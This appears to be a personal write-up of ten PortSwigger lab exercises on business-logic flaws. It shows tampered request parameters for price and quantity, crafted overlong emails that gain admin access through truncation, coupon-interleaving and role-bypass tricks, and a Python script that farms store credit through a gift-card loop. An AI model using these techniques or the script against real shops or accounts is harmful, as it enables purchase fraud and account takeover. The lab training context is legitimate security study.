# Portswigger Writeups

## Lab 1: Excessive trust in client-side controls

To solve this lab, buy the leather jacket. When added to the cart, here are the parameters sent:

```
productId=1&redir=PRODUCT&quantity=1&price=133700
```

I can change the `price` to 1, and then send the request. This sets the price of the jacket to $0.01.

![](../../.gitbook/assets/portswigger-business-writeup-image.png)

## Lab 2: High-Level Logic Vuln

To solve the lab, buy the jacket. This time, the `price` parameter is not present. When removing items from the cart, it sends another POST request:

```
productId=1&quantity=-1&redir=CART
```

I can keep sending the same request until I get a negative number of jackets:

![](../../.gitbook/assets/portswigger-business-writeup-image-1.png)

When trying to checkout, it does not let me as the total price cannot be negative. In this case, I can keep adding other products until the total price is a positive number.

![](../../.gitbook/assets/portswigger-business-writeup-image-2.png)

This method works in checking out. To exploit it, I can just add 1 jacket and then add other products in the negatives until I can afford it.

![](../../.gitbook/assets/portswigger-business-writeup-image-3.png)

## Lab 3: Inconsistent Security Controls

To solve this lab, delete the `carlos` user. I have access to an email client and I can register users using an email:

![](../../.gitbook/assets/portswigger-business-writeup-image-4.png)

I registered a user with the email and confirmed the account:

![](../../.gitbook/assets/portswigger-business-writeup-image-5.png)

I noticed that there was a domain for workers. I changed my email account to `attacker@dontwannacry.com` on the 'My Account' page.

![](../../.gitbook/assets/portswigger-business-writeup-image-6.png)

I could then access the admin panel to delete `carlos`.

## Lab 4: Flawed Enforcement of Rules

To solve this lab, buy the jacket. I noticed that there was a checkout code:

![](../../.gitbook/assets/portswigger-business-writeup-image-7.png)

At the bottom of the page when logged in, there's a newsletter sign up:

![](../../.gitbook/assets/portswigger-business-writeup-image-8.png)

This gives me a new coupon code:

![](../../.gitbook/assets/portswigger-business-writeup-image-9.png)

By using these two coupon codes, I can bypass the 'Coupon has already been used' error by interleaving their usage:

![](../../.gitbook/assets/portswigger-business-writeup-image-10.png)

It seems that the website only checks whether the **previously used coupon** is the same. Repeated usage will result in a free jacket!

![](../../.gitbook/assets/portswigger-business-writeup-image-11.png)

## Lab 5: Low-Level Logic Flaw

This lab has an integer flow error. So by adding a ton of jackets to the cart, I can cause an overflow which will make the price negative. 

![](../../.gitbook/assets/portswigger-business-writeup-image-12.png)

Eventually, after adding enough jackets, the price will almost be affordable.

![](../../.gitbook/assets/portswigger-business-writeup-image-13.png)

Just add enough items to the cart such that the total price is positive and less than 100. 

![](../../.gitbook/assets/portswigger-business-writeup-image-14.png)

Then checkout!

## Lab 6: Inconsistent Exceptional Input Handling

To solve this lab, delete `carlos` as the administrator of the website. I have access to an email client for this lab.

One thing I noted was the fact that the email client will receive emails with all subdomains.

![](../../.gitbook/assets/portswigger-business-writeup-image-15.png)

I registered with a very long email:

```
attackerwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww@exploit-0aea00fa03545b628000c58c0125005c.exploit-server.net
```

I confirmed my email via the client, and logged in. The first thing I noticed was that my email was truncated!

![](../../.gitbook/assets/portswigger-business-writeup-image-16.png)

The above has 255 characters. To access the admin panel, I need an email ending with `@dontwannacry.com`. 

To do this, I have to somehow make the website truncate my email to `email@dontwannacry.com`, but I still have to receive the actual email to confirm my account.

Since the client receives all email with the same domain, I can create an email ending with `@dontwannacry.com.EXPLOITMAIL`, and just append junk to the front such that the 'm' from `.com` is at the 255th character.

I used this email to register:

```
1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111@dontwannacry.com.exploit-0aea00fa03545b628000c58c0125005c.exploit-server.net
```

When the account is confirmed and I logged in, I could see that it worked. The website truncated the email to end with `dontwannacry.com` and I had access to the administrator panel:

![](../../.gitbook/assets/portswigger-business-writeup-image-17.png)

## Lab 7: Weak isolation on dual-use endpoint

To solve this lab, delete `carlos`. When logged in, I noticed there was a password change functionality that takes in a username and current password:

![](../../.gitbook/assets/portswigger-business-writeup-image-18.png)

By changing the `username` to `administrator` and removing the 'current password' parameter, I can change the admin's password:

![](../../.gitbook/assets/portswigger-business-writeup-image-19.png)

Then I can login and delete `carlos`.

## Lab 8: Insufficient Workflow Validation

To solve this lab, buy the jacket. When trying to buy it, I see this request being made due to me not having enough money:

![](../../.gitbook/assets/portswigger-business-writeup-image-20.png)

When buying a product I can actually afford, this is the message returned:

![](../../.gitbook/assets/portswigger-business-writeup-image-21.png)

So when intercepting requests, I can attempt to checkout and change the `err` request to the `order-confirmed` request to solve the lab. 

## Lab 9: Auth Bypass via Flawed State

To solve this lab, delete `carlos`. I intercepted each request for the login.

There was this option here to select a 'role':

![](../../.gitbook/assets/portswigger-business-writeup-image-22.png)

When intercepted, I changed the `role` parameter sent to `administrator`.

![](../../.gitbook/assets/portswigger-business-writeup-image-23.png)

However, this did not work. I tried dropping the request to the `role-selector`, and the website defaulted to make me an administrator:

![](../../.gitbook/assets/portswigger-business-writeup-image-24.png)

Then, just delete `carlos`.

## Lab 10: Infinite Money

To solve this lab, buy the jacket. I am given an email client to use. When logged in, I saw that there was a gift card redeeming function:

![](../../.gitbook/assets/portswigger-business-writeup-image-25.png)

There's also a newsletter sign up:

![](../../.gitbook/assets/portswigger-business-writeup-image-26.png)

This gives me a coupon:

![](../../.gitbook/assets/portswigger-business-writeup-image-27.png)

There was also this Gift card item:

![](../../.gitbook/assets/portswigger-business-writeup-image-28.png)

I could apply the SIGNUP30 bonus on this:

![](../../.gitbook/assets/portswigger-business-writeup-image-29.png)

So I could buy a $10 giftcard for $7. 

![](../../.gitbook/assets/portswigger-business-writeup-image-30.png)

`fDGaXvnW0E` is the code. I could buy another one:

![](../../.gitbook/assets/portswigger-business-writeup-image-31.png)

Within the email client, I can see that it gives me the token there as well:

![](../../.gitbook/assets/portswigger-business-writeup-image-32.png)

Anyways, this code is redeemable within the 'My Account' page, under the gift card section. So each time I do this, I gain $3. To exploit this server, I created a Python script to automate the entire process!

```python
import requests
import re
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

HOST = '0a8a00dd031722d08106a2300038002e'
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
url = f'https://{HOST}.web-security-academy.net'
cookies = {
	'session':'Y2AczSp5KZECDUeSaAjNzPpgxItus1Se'
}
s = requests.Session()

while True:
	## Add Product to Cart
	cart_data = {
		'productId':'2',
		'redir':'CART',
		'quantity':'1'
	}

	add_r = s.post(url + '/cart', data=cart_data,cookies=cookies,proxies=proxies,verify=False)

	## Grab CSRF token 
	r = s.get(url + '/cart',cookies=cookies,proxies=proxies,verify=False)
	match = re.search(r'name="csrf" value="([0-9a-zA-z]+)', r.text)
	cart_csrf_token = match[1]

	## Apply Coupon
	coupon_data = {
		'csrf':cart_csrf_token,
		'coupon':'SIGNUP30'
	}
	coupon_r = s.post(url + '/cart/coupon', data=coupon_data,cookies=cookies,proxies=proxies,verify=False)

	## Grab CSRF
	r = s.get(url + '/cart',cookies=cookies,proxies=proxies,verify=False)
	match = re.search(r'name="csrf" value="([0-9a-zA-z]+)', r.text)
	checkout_csrf_token = match[1]

	## Checkout 
	checkout_data = {
		'csrf':checkout_csrf_token,
	}
	checkout_r = s.post(url + '/cart/checkout',data=checkout_data,cookies=cookies,proxies=proxies,verify=False)
	pattern = re.compile(r'<td>([A-Za-z0-9]+)</td>')
	match = pattern.findall(checkout_r.text)
	if match:
        ## Apply Gift Card
		code = match[1]
		r = s.get(url + '/my-account',cookies=cookies,proxies=proxies,verify=False)
		match = re.search(r'name="csrf" value="([0-9a-zA-z]+)', r.text)
		gift_csrf = match[1]
		gift_data = {
			'csrf':gift_csrf,
			'gift-card':code
		}
		bal_r = s.post(url + '/gift-card', data=gift_data, cookies=cookies, proxies=proxies, verify=False)
		pattern = re.compile(r'<p><strong>Store credit: \$([\d.]+)</strong></p>')
		match = pattern.search(bal_r.text)
		print("Credit value: " + match.group(1))

	else:
		print('[-] Something went wrong!')
```

I was lazy to use threading, so I just waited. I also noticed that the threads tend to cause each other to fail when testing, so I think keeping to one is stabler.

